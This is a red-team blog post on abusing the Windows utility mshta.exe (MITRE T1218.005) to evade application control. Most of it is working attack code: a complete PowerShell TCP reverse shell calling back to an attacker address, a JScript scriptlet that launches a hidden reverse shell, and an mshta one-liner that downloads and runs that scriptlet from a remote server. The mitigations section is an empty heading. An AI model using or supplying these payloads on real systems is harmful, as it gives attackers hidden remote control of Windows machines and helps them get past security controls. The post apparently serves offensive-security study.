---
title: MSHTA
date: 2022-04-01 05:49:33 +0800
categories: [Red Teaming, Defense Evasion]
tags: [redteam,defense-evasion, windows, mitre, mshta]     # TAG names should always be lowercase
---

# MITRE
- ID : `T1218.005`
- Tactic : `Defense Evasion`
- Platforms: `Windows`

# MSHTA
***Mshta.exe*** is a utility that executes Microsoft HTML Applications (HTA) files. Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. Mshta.exe can be used to bypass application control solutions that do not account for its potential use.

# Exploitations

## Command Prompt

### Invoking Calculator
```batch
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc.exe"":close")

```
***invoking calculator***
![mshtacalcvbs](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/mshvbacalc.png)

### Getting Reverse Shell With Vbscript

*content of rev.ps1*

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.42.0.1',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

***Executing rev.ps1 to get a reverse shell via mshta***
```batch
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w Hidden -file rev.ps1"":close")

```
![mshtacalcvbs](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/mshvbsrev.png)

***Getting reversh shell***
![mshtacalcvbs](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/kalimshtarev.png)

### Getting Reverse Shell With Javascript

*content of exploit.sct*

```javascript

<?XML version="1.0"?>
<scriptlet>
  <!-- Reverse Shell -->

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

	function Exec()
	{
		var r = new ActiveXObject("WScript.Shell").Run('powershell -w Hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\'170.170.6.136\',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"');
	}

]]>
</script>

</scriptlet>

```

***Executing mshta to get reverse shell***
```bash
mshta.exe javascript:a=(GetObject('script:http://170.170.6.136:90/exploit.sct')).Exec();close();

```
![mshtacalcvbs](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/kalimshtarev.png)

***Getting reversh shell***
![mshtacalcvbs](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/cmdjsmshta.png)

## Metasploit WebDelivery

## Metasplot Msfvenom

## Powershell Empire

## Psencode

# Mitigations

# References

- [https://attack.mitre.org/techniques/T1218/005/](https://attack.mitre.org/techniques/T1218/005/)
- [https://docs.microsoft.com/en-us/previous-versions//ms536471(v=vs.85)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions//ms536471(v=vs.85)?redirectedfrom=MSDN)
- [https://atomicredteam.io/defense-evasion/T1218.005/](https://atomicredteam.io/defense-evasion/T1218.005/)
